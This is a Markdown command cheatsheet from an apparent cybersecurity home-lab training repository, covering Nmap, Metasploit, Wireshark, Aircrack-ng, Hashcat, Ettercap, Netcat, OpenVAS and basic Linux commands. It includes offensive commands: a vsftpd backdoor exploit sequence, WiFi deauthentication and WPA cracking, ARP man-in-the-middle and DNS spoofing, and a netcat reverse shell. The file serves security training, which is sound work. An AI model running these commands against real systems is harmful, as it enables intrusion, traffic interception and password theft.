## Overview

This document contains commonly used commands, syntax references, and operational shortcuts used throughout the NCSA Cybersecurity Home Lab environment.

The purpose of this cheatsheet is to provide:
- quick command reference
- common syntax examples
- troubleshooting shortcuts
- operational workflow reminders

---

# Network Configuration

## Linux IP Information

```bash
ip a
```

```bash
ifconfig
```

---

## Windows IP Information

```powershell
ipconfig
```

---

## Test Connectivity

```bash
ping 10.0.2.4
```

---

## View Network Connections

```bash
netstat -tunap
```

---

# Nmap

## Host Discovery

```bash
nmap -sn 10.0.2.0/24
```

---

## Service Version Detection

```bash
nmap -sV 10.0.2.4
```

---

## Operating System Detection

```bash
sudo nmap -O 10.0.2.4
```

---

## Aggressive Scan

```bash
sudo nmap -A 10.0.2.4
```

---

## Full Port Scan

```bash
nmap -p- 10.0.2.4
```

---

## Vulnerability Scripts

```bash
nmap --script vuln 10.0.2.4
```

---

# Metasploit

## Launch Metasploit

```bash
msfconsole
```

---

## Search Modules

```bash
search vsftpd
```

---

## Use Exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

## Configure Target

```bash
set RHOSTS 10.0.2.4
```

---

## Configure Local Host

```bash
set LHOST 10.0.2.3
```

---

## Launch Exploit

```bash
run
```

---

## View Sessions

```bash
sessions
```

---

## Interact with Session

```bash
sessions -i 1
```

---

# Wireshark

## Launch Wireshark

```bash
wireshark
```

---

## Common Display Filters

### HTTP Traffic

```text
http
```

### DNS Traffic

```text
dns
```

### TCP Traffic

```text
tcp
```

### Filter by IP

```text
ip.addr == 10.0.2.4
```

### Filter by Port

```text
tcp.port == 80
```

---

# Aircrack-ng

## Kill Conflicting Processes

```bash
sudo airmon-ng check kill
```

---

## Enable Monitor Mode

```bash
sudo airmon-ng start wlan0
```

---

## Discover Wireless Networks

```bash
sudo airodump-ng wlan0mon
```

---

## Capture WPA Handshake

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

---

## Deauthentication Attack

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## Crack WPA Password

```bash
sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
```

---

# Hashcat

## Dictionary Attack

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Brute-Force Attack

```bash
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
```

---

## Show Cracked Passwords

```bash
hashcat --show hashes.txt
```

---

## Benchmark Performance

```bash
hashcat -b
```

---

# Ettercap

## Enable IP Forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

---

## Discover Hosts

```bash
sudo netdiscover -r 10.0.2.0/24
```

---

## Start MITM Attack

```bash
sudo ettercap -T -M arp:remote /10.0.2.5/ /10.0.2.1/
```

---

## Start DNS Spoofing

```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.0.2.5/ /10.0.2.1/
```

---

# Netcat

## Start Listener

```bash
nc -lvnp 4444
```

---

## Connect to Remote Service

```bash
nc 10.0.2.4 80
```

---

## Banner Grabbing

```bash
nc 10.0.2.4 21
```

---

## Reverse Shell

```bash
nc 10.0.2.3 4444 -e /bin/bash
```

---

## Port Scan

```bash
nc -zv 10.0.2.4 1-100
```

---

# OpenVAS / GVM

## Verify Installation

```bash
gvm-check-setup
```

---

## Start Services

```bash
sudo gvm-start
```

---

## Stop Services

```bash
sudo gvm-stop
```

---

## Update Vulnerability Feeds

```bash
sudo greenbone-feed-sync
```

---

# Linux File Management

## List Files

```bash
ls -la
```

---

## Change Directory

```bash
cd /path/to/directory
```

---

## Create File

```bash
touch file.txt
```

---

## Copy File

```bash
cp source.txt destination.txt
```

---

## Move File

```bash
mv file.txt /destination/
```

---

## Remove File

```bash
rm file.txt
```

---

# Linux Permissions

## Change Permissions

```bash
chmod 755 script.sh
```

---

## Change Ownership

```bash
sudo chown user:user file.txt
```

---

# Process Management

## View Running Processes

```bash
ps aux
```

---

## Kill Process

### SIGTERM(Normal)

```bash
kill -15 PID
```

### Indescrimiate(Corruption Possible)

```bash
kill -9 PID
```

---

# grep and cut

## Search Text

```bash
grep "password" file.txt
```

---

## Extract Columns

```bash
cut -d ":" -f 1 file.txt
```

---

# OpenSSL

## Generate MD5 Hash

```bash
echo -n "password" | md5sum
```

---

## Generate SHA256 Hash

```bash
echo -n "password" | sha256sum
```

---

# Useful Notes

- Run aggressive scans carefully to avoid excessive traffic.
- UDP scans are slower than TCP scans.
- Packet captures can consume large amounts of storage.
- Weak passwords are vulnerable to dictionary attacks.
- MITM attacks require systems to share the same network segment.

---

# Ethical Use Notice

All commands documented in this repository were executed within controlled educational lab environments for cybersecurity training purposes only.

Do not perform unauthorized scanning, exploitation, interception, password attacks, or traffic analysis against systems without explicit authorization.